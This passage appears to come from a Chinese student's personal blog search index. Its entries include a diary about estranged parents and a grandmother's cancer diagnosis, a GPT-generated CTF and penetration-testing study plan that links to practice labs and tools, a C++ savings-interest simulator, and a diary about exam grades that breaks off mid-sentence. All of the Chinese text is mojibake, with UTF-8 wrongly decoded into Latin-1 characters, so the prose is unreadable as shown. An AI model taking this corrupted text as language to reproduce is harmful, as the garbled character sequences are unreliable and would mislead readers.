\n**é‚£è¿™ï¼Œæ‰€è°“çˆ¶æ¯å’Œé™Œç”Ÿäººæœ‰ä»€ä¹ˆåŒºåˆ«...**  \n\næˆ‘ä¸€ç›´å®‰æ…°è‡ªå·±ï¼Œ**ä»–ä»¬å·¥ä½œå¿™ï¼Œä»–ä»¬è¦å…»å®¶ï¼Œä»–ä»¬è¦ç…§é¡¾å¼Ÿå¼Ÿã€‚**  \nå¯æ˜¯ï¼Œç°åœ¨æˆ‘ä¸Šäº†å¤§å­¦ï¼Œ**æˆ‘è¿˜æ˜¯åœ¨å®‰æ…°è‡ªå·±ã€‚**  \nä»–ä»¬ä»æ²¡ç»™æˆ‘å‘è¿‡ç”Ÿæ´»è´¹ï¼Œé›¶èŠ±é’±éƒ½æ²¡æœ‰ï¼Œç”šè‡³æ²¡é—®è¿‡æˆ‘ç¼ºä»€ä¹ˆï¼Œæœ‰æ²¡æœ‰å—å§”å±ˆã€‚  \nä»–ä»¬è¿˜æ‹¿èµ°äº†æˆ‘çš„å‡å­¦çº¢åŒ…ï¼Œç”šè‡³**è¿˜åœ¨è§Šè§æˆ‘çš„æ¯”èµ›å¥–é‡‘ï¼Œè¯´æ˜¯â€œè¡¥è´´å®¶ç”¨â€ã€‚**  \n\n---\n\n## ç†è§£\n**å¥¶å¥¶æ€»æ˜¯è®©æˆ‘ç†è§£çˆ¶æ¯ã€‚**  \næˆ‘çˆ±å¥¶å¥¶ï¼Œæˆ‘å¬å¥¶å¥¶çš„è¯ã€‚  \nä½†è¿™ä¸€ç‚¹ï¼Œ**æˆ‘å¾ˆéš¾å¬ä¸‹å»ã€‚**  \n\nå¥¶å¥¶è¯´ï¼Œ**ä»¥åæœ‰å›°éš¾ï¼Œæ‰¾çˆ¸å¦ˆã€‚**  \nå¯æˆ‘å®æ„¿å»æ‰¾å§‘å¦ˆï¼Œä¹Ÿä¸æƒ³æ‰¾ä»–ä»¬ã€‚  \n\n**æˆ‘å°æ—¶å€™å°±å¯¹å»çˆ¶æ¯å®¶æœ‰æŠµè§¦æ„Ÿäº†ã€‚**  \nå›çˆ·çˆ·å¥¶å¥¶å®¶ï¼Œæˆ‘å¾ˆå¼€å¿ƒï¼Œå› ä¸ºé‚£é‡Œæ˜¯å®¶ã€‚  \nå»å§‘å¦ˆå®¶ï¼Œæˆ‘ä¹Ÿå¾ˆå¼€å¿ƒï¼Œå› ä¸ºå§‘å¦ˆå®¶å¾ˆå¥½å¾ˆå¥½ã€‚  \nä½†å»çˆ¸å¦ˆå®¶â€¦â€¦æˆ‘çŸ¥é“è‡ªå·±â€œåº”è¯¥â€å»ï¼Œå¯å¿ƒé‡Œæ€»æ˜¯æœ‰ç§è¯´ä¸å‡ºçš„æŠµè§¦æ„Ÿã€‚  \n\nå¥¶å¥¶æ€»æ˜¯æƒ³å»çˆ¶æ¯å®¶ï¼Œè¯´æ˜¯æƒ³**ç…§é¡¾å¼Ÿå¼Ÿï¼Œçœ‹çœ‹çˆ¸çˆ¸**ã€‚  \nå¯æˆ‘çŸ¥é“ï¼Œ**å¼Ÿå¼Ÿå¯¹å¥¶å¥¶å¾ˆç”Ÿç–ï¼Œä»–åªæ˜¯æŠŠå¥¶å¥¶å½“ä½œä¸€ä¸ªèƒ½è®©ä»–ç©æ‰‹æœºçš„â€œææ‰‹æœºæœºå™¨â€è€Œå·²ã€‚**  \nå¥¶å¥¶åœ¨æ„çš„çˆ¸çˆ¸ï¼Œä¹Ÿæ²¡æ€ä¹ˆçœŸæ­£å…³å¿ƒè¿‡å¥¹ï¼Œæ²¡æœ‰ä¸»åŠ¨ç»™å¥¶å¥¶æ‰“è¿‡ç”µè¯ï¼Œå›å®¶ä¹Ÿåªæ˜¯è‡ªé¡¾è‡ªçš„æ‰“é­”å…½ï¼Œä¸å’Œå¥¶å¥¶è¯´è¯´è¯ã€‚  \n**é‚£ä¸ºä»€ä¹ˆå¥¹æ€»æ˜¯è¦å»â€œç…§é¡¾â€ä»–ä»¬ï¼Ÿ**  \n\næˆ–è®¸æ˜¯æˆ‘å¤ªåœ¨ä¹å¥¶å¥¶ã€‚\nä¸è¿‡æˆ‘ä¸å–œæ¬¢å¾…åœ¨é‚£é‡Œã€‚**ä»é‚£ä¸€åˆ»çš„å¤±æœ›èµ·ï¼Œæˆ‘ç¡®å®šäº†è€Œå·²ã€‚**  \n\n---\n\n## æˆ‘ä¸æƒ³å›å®¶...\n**æˆ‘å…¶å®æƒ³ä¸€ç›´ä¸å»ã€‚**  \n\næˆ‘å®æ„¿å‡æœŸå»å§‘å¦ˆå®¶ã€çˆ·çˆ·å¥¶å¥¶å®¶ï¼Œ**éƒ½ä¸æƒ³å¾…åœ¨çˆ¶æ¯å®¶ã€‚**  \n\né‚£é‡Œç¦»å­¦æ ¡æœ€è¿‘ï¼Œåé«˜é“åªè¦**10åˆ†é’Ÿ**ï¼Œä½†å´æ˜¯ç¦»æˆ‘æœ€è¿œçš„åœ°æ–¹ã€‚  \n\nå¥¶å¥¶æ€»æ˜¯é—®æˆ‘ä»€ä¹ˆæ—¶å€™å»çˆ¶æ¯å®¶ï¼Œæˆ‘å¾ˆæƒ³å‘Šè¯‰å¥¹â€”â€”  \n\n> **æˆ‘ä¸æƒ³å›é‚£é‡Œï¼Œä¸€åˆ»éƒ½ä¸æƒ³åœç•™ã€‚**  \n>\n> **å‡æœŸç»“æŸå‰ï¼Œæˆ‘åªæƒ³ç›´æ¥å›å­¦æ ¡ã€‚**  \n\nåªæ˜¯ï¼Œæˆ‘ä¸æƒ³å†ç¡åœ¨é‚£ä¸ª**æ²¡æœ‰æ”¶æ‹¾çš„åºŠï¼Œå‘é»„çš„æ•å¤´ï¼Œå†°å†·çš„è–„è¢«å­ï¼Œä¹±æ”¾æ‚ç‰©çš„â€œæˆ‘çš„æˆ¿é—´â€äº†ã€‚**\n\n---\n## åªæ˜¯...\nè™½ç„¶é‚£é‡Œå¾ˆå†·ã€‚\n**ä½†æ˜¯æ¯•ç«Ÿé‚£ä¸€ç›´æ˜¯å®¶ã€‚è™½ç„¶å†·ï¼Œä½†é‚£æ¯•ç«Ÿæ˜¯ä¸€ä¸ªä½çš„åœ°æ–¹**ã€‚\n\n## åæ—¥è°ˆ\n\n### ç¡®è¯Š\nå¥¶å¥¶æœ€ç»ˆè¢«ç¡®è¯Šä¸ºæ—©æœŸå–‰ç™Œï¼Œåœ¨æ¹˜é›…è¯Šæ–­åè½¬å»å—åä½é™¢äº†ï¼Œåœ¨é‚£é‡Œæœ‰æˆ‘å§‘æ¯ç…§é¡¾ä¹Ÿæ¯”åœ¨é•¿æ²™ä½é™¢å¥½ä¸€äº›ã€‚\n\n![ç»“æœ](/images/home/ç»“æœ.jpg)\nçˆ¶äº²ä¹Ÿå¼€è½¦ï¼Œå½“å‘¨è½¬å¸æœºï¼Œå½“ä¸€ä¸ªå°½èŒå°½è´£çš„å„¿å­ã€‚è¿™å‡ å¤©ä¸€ç›´åœ¨æ ªæ´²å’Œé•¿æ²™å‘¨è½¬ï¼Œæ¯å¤©æ—©ä¸Šå°±å¼€è½¦ï¼Œè¿˜ç»™å¥¶å¥¶é€é¥­é€èœï¼Œé™ªå¥¶å¥¶åšå®Œæ£€æŸ¥ååˆæ™šä¸Šå¼€è½¦å›å»ã€‚\næˆ‘å°±åšå‘†åœ¨é•¿æ²™çš„é™ªæŠ¤ï¼Œçˆ¶äº²å»å¿™æ£€æŸ¥çš„äº‹æƒ…çš„æ—¶å€™ï¼Œæˆ‘å°±é™ªç€å¥¶å¥¶ï¼Œç»™å¥¶å¥¶åšä¸ªç¿»è¯‘ã€‚ä¹‹å‰æ˜¯å¥¶å¥¶è¯´è¯å£°éŸ³å¤ªå°åšæ‰©å£°å™¨ï¼Œç°åœ¨å°±æ˜¯çœ‹æ‰‹è¯­å’Œæ¯”åˆ’åšè½¬è¯‘å™¨ã€‚çˆ¶äº²è¯´æœ‰æˆ‘åœ¨å¥¶å¥¶èº«è¾¹ä»–ä¼šå®‰å¿ƒå¾ˆå¤šï¼Œè¿™ä¹Ÿæ˜¯ç½•è§çš„**çˆ¶äº²å¯¹æˆ‘è¯´æˆ‘è®©ä»–å®‰å¿ƒçš„æ—¶å€™ã€‚**\n\næˆ‘ä¹Ÿå¼€å§‹è§‰å¾—çˆ¶äº²æŒºè¾›è‹¦çš„ã€‚æˆ‘çš„æ€§æ ¼ä¸ä¹ æ€§å’Œçˆ¶äº²å¾ˆç›¸ä¼¼ï¼Œè™½ç„¶æ²¡æœ‰ä¸€èµ·ç”Ÿæ´»è¶…è¿‡ä¸€ä¸ªæœˆè¿‡å§ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å€Ÿç€åŸºå› é—ä¼ äº†å¾ˆå¤šä»–çš„æ€§æ ¼ï¼Œæ¯”å¦‚æ‡’æƒ°ï¼Œæ‹–æ‹‰ï¼Œæ‚²è§‚ï¼Œåˆ©å·±ã€‚å“¦å¯¹äº†ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯é‡è§†äº²æƒ…ï¼Œè‡³å°‘å¯¹å¾…äº²æƒ…æ–¹é¢ä¸ä¼šæ— æ‰€è°“ã€‚\n\næˆ–è®¸æ˜¯é•¿å¤§äº†ä¸€ç‚¹å§ï¼Ÿ...ä¹Ÿè®¸å§ã€‚ä¹‹å‰è¿˜æ˜¯å¤±æœ›å¤ªå¤šï¼Œå¯¼è‡´ä¸€ç‚¹ç‚¹å¤¸å¥–éƒ½æ˜¾å¾—å¼¥è¶³çè´µã€‚åˆæˆ–è®¸æ˜¯çˆ¶äº²ä¹Ÿé•¿å¤§äº†ä¸€äº›ï¼Œæˆ‘èƒ½ç†è§£ä»–ï¼Œé‚£äº›äº‹æƒ…æ¢æˆ‘å»åšï¼Œä¼°è®¡æˆ‘è¡¨ç°çš„å’Œçˆ¶äº²åº”è¯¥å¤§å·®ä¸å·®ã€‚æœ‰æ—¶å€™æˆ‘ä¹Ÿè§‰å¾—ï¼Œ**çˆ¶äº²æ˜¯æˆ‘é•¿å¤§åçš„ä¸€ä¸ªå¹»å½±ã€‚**\n\n### è¿”æ ¡\nè¯Šæ–­ç»“æœå‡ºæ¥åï¼Œå’ŒåŒ»ç”ŸèŠäº†æ²»ç–—æ–¹æ¡ˆï¼Œé‰´äºå¥¶å¥¶çš„ç‰¹æ®Šæƒ…å†µåŠ äºŒæ¬¡ç™Œç—‡ï¼Œåœ¨åŸç™Œç—‡åŒºåŸŸåšæ”¾åŒ–ç–—è¿˜æ˜¯ä¸å¯èƒ½çš„ï¼Œäºæ˜¯è¯´äº†è€ƒè™‘é¶å‘æ²»ç–—ã€‚\nå•Šå“ˆï¼Œé«˜ä¸­ç”Ÿç‰©çš„æ—¶å€™å­¦çš„é‚£ä¹ˆå¤šä¸œè¥¿ï¼Œé¶å‘æ²»ç–—ï¼Œå•å…‹éš†æŠ—ä½“ï¼Œç»†èƒå…ç–«ä»€ä¹ˆçš„ç®—æ˜¯ç»ˆäºæœ‰äº†ä¸€äº›å®æ„Ÿã€‚\näº¤æµå®Œåæ‰“ç®—è½¬é™¢å»è¡¡é˜³äº†ï¼Œå—åé‚£è¾¹ç»™å‡ºçš„æ²»ç–—æ–¹æ¡ˆä¹Ÿæ˜¯é¶å‘æ²»ç–—ï¼Œè€Œä¸”è¡¡é˜³é‚£è¾¹è¿˜æœ‰å§‘å¦ˆç…§åº”ç€ï¼Œæˆ‘å’Œçˆ¶äº²å°±æ²¡æœ‰é‚£ä¹ˆç´¯äº†ã€‚\n\næ°å¥½ä¹Ÿå¿«å¼€å­¦äº†ï¼Œæˆ‘è®©çˆ¶äº²æŠŠæˆ‘ä¸¢åˆ°é•¿æ²™ï¼Œè¿‡äº†å‡ å¤©å•äººå¯çš„æ—¥å­ã€‚\nå•äººå¯æ˜¯å¾ˆçˆ½ï¼Œä¹Ÿå¾ˆå­¤ç‹¬ã€‚æˆ‘å€’ä¸æ˜¯é‚£ç§æ²¡äººèŠå¤©å°±ç‰¹åˆ«æ— èŠçš„Eäººï¼Œåªæ˜¯æ„Ÿè§‰ä¸€ä¸ªäººçš„å¯å®¤å°±ç®—å¼€äº†ç©ºè°ƒä¹Ÿå†·å¾—å¾ˆã€‚æˆ‘çš„å¯å®¤å…³ç³»ä¸é”™ï¼Œç›®å‰æˆ‘åœ¨å¤§å­¦é‡Œèƒ½è¯´å¾—ä¸Šè¯çš„æœ‹å‹ä¹Ÿå°±èˆå‹äº†ã€‚\nç¦»å¼€å­¦çš„æ—¥å­è¶Šè¿‘ï¼Œå­¦æ ¡çš„äººä¹Ÿè¶Šæ¥è¶Šå¤šã€‚æˆ–è®¸å¾ˆå¿«æˆ‘å°±ä¼šæ€€å¿µç°åœ¨çš„è¿™ä»½å­¤ç‹¬äº†ã€‚\n**æŠ±æ€¨åˆ°è¿™é‡Œã€‚æˆ‘ä»¬æ–°å­¦æœŸè§å§**ã€‚\n\n","tags":["ç”Ÿæ´»"],"categories":["æ‚è°ˆ"]},{"title":"æ¸—é€å­¦ä¹ ","url":"/2025/02/06/xue-xi/ctf/shen-tou-xue-xi-ji-hua/","content":"\n# ğŸ›¡ CTF å­¦ä¹ è®¡åˆ’\nGPTç»™çš„\n\n## ğŸ“Œ **ç¬¬ 1 é˜¶æ®µï¼šç¯å¢ƒæ­å»º**\n| ä»»åŠ¡ | æ¨èèµ„æº |\n|------|------|\n| å®‰è£… Kali Linuxï¼ˆVMware/VirtualBoxï¼‰ | [Kali å®˜æ–¹ç½‘ç«™](https://www.kali.org/) |\n| é…ç½® Web æ¸—é€å·¥å…·ï¼ˆBurp Suite, sqlmapï¼‰ | [Burp Suite æ–‡æ¡£](https://portswigger.net/burp), [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap) |\n| å®‰è£… pwn è°ƒè¯•å·¥å…·ï¼ˆgdb, pwndbg, ropperï¼‰ | [pwndbg GitHub](https://github.com/pwndbg/pwndbg), [Ropper å·¥å…·](https://github.com/sashs/Ropper) |\n\n---\n\n## ğŸ”¥ **ç¬¬ 2 é˜¶æ®µï¼šWeb æ¸—é€åŸºç¡€**\n| ä»»åŠ¡ | æ¨èèµ„æº |\n|------|------|\n| åœ¨ DVWA ç»ƒä¹  SQL æ³¨å…¥ï¼Œä½¿ç”¨ sqlmap | [DVWA é¶åœº](http://www.dvwa.co.uk/), [sqlmap æ•™ç¨‹](https://github.com/sqlmapproject/sqlmap/wiki) |\n| å­¦ä¹  XSSï¼ˆåå°„å‹ã€å­˜å‚¨å‹ã€DOM XSSï¼‰ | [XSS å¹³å° xsshunter](https://xsshunter.com/), [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/) |\n| ç»ƒä¹  Webshell ä¸Šä¼ ç»•è¿‡ | [Hack The Box Webshell é¢˜ç›®](https://www.hackthebox.com/) |\n| å­¦ä¹  SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ | [SSRF å®æˆ˜æ•™ç¨‹](https://portswigger.net/web-security/ssrf) |\n| åœ¨ HackTheBox é‡Œå°è¯•ä¸€ä¸ª Web é¶æœº | [HackTheBox å…¥å£](https://www.hackthebox.com/) |\n\n---\n\n## ğŸ’€ **ç¬¬ 2 é˜¶æ®µï¼šPwn æ¼æ´åˆ©ç”¨**\n| ä»»åŠ¡ | æ¨èèµ„æº |\n|------|------|\n| å­¦ä¹ åŸºç¡€ç¼“å†²åŒºæº¢å‡ºï¼ˆBuffer Overflowï¼‰ | [pwnable.kr å®˜ç½‘](http://pwnable.kr/) |\n| ä½¿ç”¨ gdb è°ƒè¯• pwnable.kr çš„åŸºç¡€é¢˜ | [GDB ä½¿ç”¨æ‰‹å†Œ](https://sourceware.org/gdb/) |\n| å­¦ä¹ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆFormat Stringï¼‰ | [æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ CTF é¢˜è§£](https://ctftime.org/writeups) |\n| ç»ƒä¹  ROPï¼Œåˆ©ç”¨è¿”å›åœ°å€æ‰§è¡Œ shell | [ROP Emporium ç»ƒä¹ ](https://ropemporium.com/) |\n\n---\n\n## ğŸš€ **ç¬¬ 3 é˜¶æ®µï¼šçœŸå®æ¼æ´ç ”ç©¶**\n| ä»»åŠ¡ | æ¨èèµ„æº |\n|------|------|\n| åœ¨ Exploit-DB æ‰¾ä¸€ä¸ª CVE æ¼æ´å¤ç° | [Exploit-DB](https://www.exploit-db.com/) |\n| å­¦ä¹  CVE æ¼æ´åˆ©ç”¨çš„ PoC ç¼–å†™ | [CVE Details](https://www.cvedetails.com/) |\n| å°è¯•å†™è‡ªå·±çš„ç®€å• Exploit | [Python ç¼–å†™ Exploit æ•™ç¨‹](https://www.offensive-security.com/metasploit-unleashed/exploit-development/) |\n| æŒ‘æˆ˜ HackTheBox é‡Œçš„çœŸå®é¶æœº | [HackTheBox æŒ‘æˆ˜åˆ—è¡¨](https://www.hackthebox.com/) |\n\n---\n\n## ğŸ¯ **å­¦ä¹ æ–¹æ³•å»ºè®®**\n- **æ¯ä¸ªé˜¶æ®µè‡³å°‘å®Œæˆ 3-5 ä¸ªä»»åŠ¡åå†è¿›å…¥ä¸‹ä¸€é˜¶æ®µ**\n- **é‡åˆ°é—®é¢˜æ—¶ï¼Œä¼˜å…ˆæŸ¥æ‰¾ Writeupï¼ˆé¢˜è§£ï¼‰ï¼Œç„¶åè‡ªå·±å°è¯•**\n- **å¯ä»¥åœ¨åšå®¢æˆ–ç¬”è®°ä¸­è®°å½•æ¯ä¸ªé˜¶æ®µçš„æ”¶è·**\n- **å¦‚æœæœ‰ä¸æ‡‚çš„ï¼Œå» CTFHub / XCTF ç¤¾åŒºäº¤æµ**\n- **æœ€é‡è¦çš„æ˜¯ï¼ŒåŠ¨æ‰‹å®æ“ï¼Œä¸åªæ˜¯çœ‹ç†è®ºï¼**\n\n---","tags":["å­¦ä¹ ","CTF","è®¡åˆ’"],"categories":["CTFå­¦ä¹ "]},{"title":"å­˜ä¸ªåˆ©æ¯ä»£ç ","url":"/2025/01/18/sheng-huo/za-tan/cun-ge-li-xi-dai-ma/","content":"\n# è¿™åªæ˜¯ä¸€ä¸ªå­˜æ¡£ï¼Œç”¨æ¥å­˜å‚¨æˆ‘çš„æ”¯ä»˜å®çš„å°è·åŒ…çš„è®¡åˆ’æ”¶ç›Š\nç›®å‰æƒ³çš„æ˜¯ä¸€å¤©1å…ƒå¼€å§‹0.03å…ƒç´¯åŠ çš„ç¨³å®šå­˜å‚¨ï¼Œå…ˆè¿™æ ·å¼€å§‹å§ï¼Œè¿è¡Œä»£ç çœ‹çœ‹ä¸€å¹´å200å…ƒ/åˆ†çš„æ”¶ç›Š+æ¯ä¸ªæœˆ200çš„å›ºå®šå­˜å‚¨+æ¯æ—¥å­˜å‚¨çœ‹çœ‹ä¸€å¹´åèƒ½å­˜å¤šå°‘é’±ã€‚\n\nå•Šï¼Œå¦‚æœæœ‰ä»€ä¹ˆå¥–é‡‘å•Šæˆ‘ä¹Ÿä¼šå­˜è¿›å»çš„ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ”’å‡ºä¸€ä¸ªswitch2æˆ–è€…å…¶ä»–ç”µå­äº§å“ä»€ä¹ˆçš„...\næˆ–è€…æ˜å¹´ä¹°GTA6çš„é’±ï¼Ÿæˆ–è€…ä¸‹ä¸€å¼ GIDLEä¸“è¾‘çš„é’±ï¼Ÿ\nå…ˆä¸€å¹´å¼€å§‹å§ï¼Œç•™ç‚¹é’±æ¯”ä»€ä¹ˆéƒ½æœ‰ç”¨ã€‚\n\n---\næŠŠå‡½æ•°å°è£…äº†ä¸€ä¸‹ï¼Œ[æ‰”åˆ°ä¸€ä¸ªå°ä»“åº“äº†](https://github.com/Moyuin-aka/daily_life_code.git)ã€‚\nç”¨cmakeæ„å»ºçš„å°é¡¹ç›®ï¼Œä»¥ä¸‹å¤§æ¦‚å°±æ˜¯æ–°æ”¹åŠ¨å§ã€‚\n>main.cpp\n```cpp \n#include <iostream>\n#include \"simulate.h\"\nusing namespace std;\n\nint main()\n{\nÂ  Â  //system(\"chcp 65001\");\nÂ  Â  double initial_input = 1.33; Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // åˆå§‹å­˜å…¥é‡‘é¢\nÂ  Â  double total_sum = 3600; Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // æ€»å­˜æ¬¾\nÂ  Â  double per_rate = 0.03; Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  // æ¯æœˆé€’å¢æ¯”ä¾‹\nÂ  Â  double monthly_expense = 2000 - 150 - 200; Â  Â  Â // æ¯æœˆå›ºå®šæ”¯å‡ºï¼ˆç”Ÿæ´»è´¹ã€è®¢é˜…è´¹ç­‰ï¼‰\nÂ  Â  double daily_food_expense = (5 + 20 + 20) * 30; // æ¯æœˆé¤è´¹æ”¯å‡º\nÂ  Â  printf(\"åˆå§‹å­˜å…¥é‡‘é¢ä¸º %.2f, æ¯æœˆé€’å¢æ¯”ç‡ä¸º %.2f\\n\\n\", initial_input, per_rate);\nÂ  Â  simulateYear(initial_input, total_sum, per_rate, monthly_expense, daily_food_expense);\nÂ  Â  return 0;\n}\n```\n>å‡½æ•°åº“simulate.h\n```cpp\n#include \"simulate.h\"\n#include <iostream>\n#include<cmath>\nusing namespace std;\n\nvoid simulateYear(double initial_input, double total_sum, double per_rate, double monthly_expense, double daily_food_expense)\n{\n    int month = 2;            // å½“å‰æœˆä»½\n    double monthly_input = 0; // æœ¬æœˆå­˜æ¬¾\n    double remain = 0;        // å‰©ä½™ä½™é¢\n    double package_interest = 0;\n    double package_monthly_interest = 0;\n\n    // æ¨¡æ‹Ÿ365å¤©\n    for (int i = 0; i < 365; i++)\n    {\n        simulateDay(total_sum, monthly_input, initial_input, per_rate, package_interest, package_monthly_interest);\n\n        // æ¯ä¸ªæœˆç»“æŸåï¼Œè®¡ç®—å‰©ä½™ä½™é¢\n        if (i % 30 == 0 && i != 0)\n        {\n            simulateMonth(total_sum, monthly_input, monthly_expense, daily_food_expense, remain, package_monthly_interest, month);\n            month++;\n            monthly_input = 0; // é‡ç½®æœ¬æœˆå­˜æ¬¾\n        }\n    }\n\n    // æ‰“å°æœ€ç»ˆç»“æœ\n    printf(\"å°è·åŒ…å¸¦æ¥çš„æ”¶ç›Šä¸ºï¼š %.2f\\n\", package_interest);\n    printf(\"æœ¬å¹´åº¦æœªå­˜æ¬¾çš„å¯æ”¯é…çš„æ”¯å‡ºä¸º: %.2f\\n\", 2000 * 12 - total_sum);\n    printf(\"æ¯æ—¥å­˜å…¥é‡‘é¢æœ€ç»ˆä¸º: %.2f\\n\", initial_input);\n    printf(\"æœ€ç»ˆå‰©ä½™ä½™é¢ä¸º: %.2f\\n\", remain);\n}\n\nvoid simulateDay(double &total_sum, double &monthly_input, double &initial_input, double per_rate, double &package_interest, double &package_monthly_interest)\n{\n    total_sum += initial_input;     // æ€»å­˜æ¬¾ç´¯è®¡\n    monthly_input += initial_input; // æœ¬æœˆå­˜æ¬¾ç´¯è®¡\n    initial_input += per_rate;      // å¢åŠ é€’å¢é‡‘é¢\n    // è®¡ç®—æ”¶ç›Šï¼šæ¯200å…ƒå­˜æ¬¾äº§ç”Ÿ0.01å…ƒæ”¶ç›Š\n    double current_interest = floor(total_sum / 200) * 0.01; // æ»¡200å…ƒçš„éƒ¨åˆ†è®¡ç®—æ”¶ç›Š\n    total_sum += current_interest;                           // æ”¶ç›ŠåŠ åˆ°å­˜æ¬¾é‡Œ\n    monthly_input += current_interest;\n    package_interest += current_interest;\n    package_monthly_interest += current_interest;\n}\n\nvoid simulateMonth(double &total_sum, double &monthly_input, double monthly_expense, double daily_food_expense, double &remain, double &package_monthly_interest, int month)\n{\n    total_sum += 200;                                                             // æ¯æœˆå­˜å…¥ä¸¤ç™¾\n    double current_remain = monthly_expense - monthly_input - daily_food_expense; // å½“å‰æœˆå‰©ä½™é‡‘é¢\n    remain += current_remain;                                                     // ç´¯è®¡å‰©ä½™ä½™é¢\n    cout << \"ç¬¬ \" << month << \" ä¸ªæœˆçš„å­˜å…¥é‡‘é¢ä¸º: \" << monthly_input << \" æœ¬æœˆæ‰€æœ‰å­˜å…¥æ€»é¢ä¸º: \" << monthly_input << endl;\n    printf(\"æœ¬æœˆé¤è´¹ä¸º %.2f\\n\", monthly_expense - monthly_input);\n    printf(\"å‰©ä½™ä½™é¢ä¸º %.2f\\n\", remain);\n    printf(\"æœ¬æœˆæ”¶ç›Šä¸º %.2f\\n\", package_monthly_interest);\n    printf(\"ç›®å‰å­˜å…¥æ€»é‡‘é¢ä¸º %.2f\\n\", total_sum + 0.04);\n    cout << endl;\n    package_monthly_interest = 0;\n}\n```","tags":["ç¼–ç¨‹","ç”Ÿæ´»"],"categories":["æ—¥å¸¸å­¦ä¹ ","ç”Ÿæ´»ä»£ç "]},{"title":"ç–²æƒ«","url":"/2025/01/13/sheng-huo/ji-lu/pi-bei/","content":"# **å¤§ä¸€ä¸ŠæœŸæœ«ï¼ï¼**\n\n## **ç¨‹åºè®¾è®¡å–œè¢«å¡ç»©ç‚¹ï¼Œä½†æ˜¯...** ç¨‹åºè®¾è®¡\n*88ï¼Œå“ˆå“ˆï¼Œæ€»è¯„ 88....*\n\nè™½ç„¶æœŸæœ«ä¸€è€ƒå®Œå°±çŸ¥é“è‡ªå·±é”™äº†ä¸¤ä¸ªæ¦‚å¿µç±»çš„é€‰æ‹©é¢˜ï¼Œå°±çŸ¥é“è‡ªå·±ç¨‹åºè®¾è®¡è¿™åˆ†æ•°å®Œè›‹äº†ï¼Œä½†æ˜¯ä¸€çœ‹åˆ°ç¨‹åºè®¾è®¡88çš„æ€»è¯„æˆ‘è¿˜æ˜¯ç ´é˜²äº†...éš¾è¿‡ä¸€å¤©ã€‚\nä½†åˆæ€ä¹ˆæ ·å‘¢ï¼Œæˆ‘èƒ½è¯´ä»€ä¹ˆå‘¢ï¼Ÿã€‚ã€‚ã€‚ã€‚\n![æˆç»©åˆ†å¸ƒ](/images/tired/c++_design.png)\næ‰å¤§ä¸€ï¼Œæ— æ‰€è°“äº†...å—ï¼Ÿ\n\næˆ–è®¸æˆ‘æ²¿è¢­ç€é«˜ä¸­çš„æ€è·¯ï¼Œæˆä¸ºäº†æ‰€è°“ä¼˜ç»©ä¸»ä¹‰è£¹æŒŸçš„å¤§å­¦ç”Ÿ...\n**æ²¡æ»¡ç»©ç‚¹ä½†åˆæ€æ ·å‘¢**ï¼Ÿæˆ‘ä¸€ç›´åœ¨è¿™æ ·é—®è‡ªå·±.....\næˆ‘å·²ç»æ¥åˆ°äº†å¤§å­¦ï¼ŒæŒ‰é“ç†æ¥è¯´ï¼Œæˆç»©åº”å½“ä¸æˆä¸ºè¯„ä»·è‡ªå·±çš„æ–¹å¼å•Šã€‚...å†µä¸”å·²ç»æœ‰äººå‘Šè¯‰æˆ‘ï¼Œ88åˆ†å·²ç»æ˜¯å¾ˆé«˜çš„æˆç»©äº†...\næˆ‘çš„å®Œç¾ä¸»ä¹‰æ€»æ˜¯åœ¨è¿™ä¸ªæ—¶å€™ä½œç¥Ÿã€‚åœ¨è¯„ä»·ä½“ç³»ä¸­ï¼Œå½“æˆ‘å‘ç°æˆ‘ä¸æ˜¯å‰æ’ï¼Œæˆ–è€…ä¸æ˜¯é¡¶å°–é‚£ä¸€æ‰¹ï¼Œå³ä¾¿æˆ‘æ€»æ˜¯å‘†åœ¨é‚£ä¸ªä¸­ä¸Šçš„ç­‰çº§ï¼Œä½†æˆ‘æ€»è§‰å¾—è‡ªå·±å¥½åƒï¼Œä¸å¤Ÿå¥½ï¼Œä¸å¤Ÿå®Œç¾å•Š....\n**æˆ‘åœ¨å®‰æ…°è‡ªå·±**ï¼Œæˆ‘è¯´ï¼Œæˆ‘æ‰å¤§ä¸€ï¼Œè¿™ç‚¹å·®è·å®Œå…¨å¯ä»¥è¿½å¹³ï¼Œåˆä¸æ˜¯å¤©å ‘ï¼Œä¸€åˆ‡éƒ½è¿˜æœ‰å¯èƒ½ã€‚\n**ä½†æˆ‘åˆæ„Ÿè§‰ï¼Œæˆ‘å…¶å®ä¸éœ€è¦å®‰æ…°è‡ªå·±**ã€‚æˆ‘å®Œå…¨å¯ä»¥è€ƒå®Œè¯•åï¼Œä¸¢æ‰è¿™ä¸€åˆ‡è€ƒè¯•ï¼Œä¸“å¿ƒåšä¸€äº›æˆ‘æ„Ÿå…´è¶£çš„äº‹æƒ…...å¤§å­¦ä¸æ˜¯é«˜ä¸­åˆä¸­ï¼Œæˆ‘ä¸éœ€è¦å†è¿›è¡Œä¸€æ¬¡é«˜è€ƒä¸­è€ƒäº†ï¼Œæˆ‘æ²¡å¿…è¦å› ä¸ºæˆç»©è€Œéš¾è¿‡å‘€ã€‚å°±ç®—è¿½ä¸å¹³åˆæ€æ ·ï¼Ÿä¿ç ”ä¸è¡Œæˆ‘å°±è€ƒç ”ï¼Œè€ƒç ”ä¸æƒ³å°±å»èµ°é€‰è°ƒè€ƒå…¬ï¼Œè€ƒå…¬ä¸æ„Ÿå…´è¶£å°±ç›´æ¥å»æ‰¾å·¥ä½œèµšé’±å»ï¼Œåªæ˜¯æƒ³è¯´ï¼Œ**æˆ‘ä¸ºä»€ä¹ˆè¦æ‹˜æ³¥äºæˆç»©é‡Œï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿˜ä¸ºæ²¡è€ƒåˆ°å¥½æˆç»©ï¼Œç”šè‡³åªæ˜¯å› 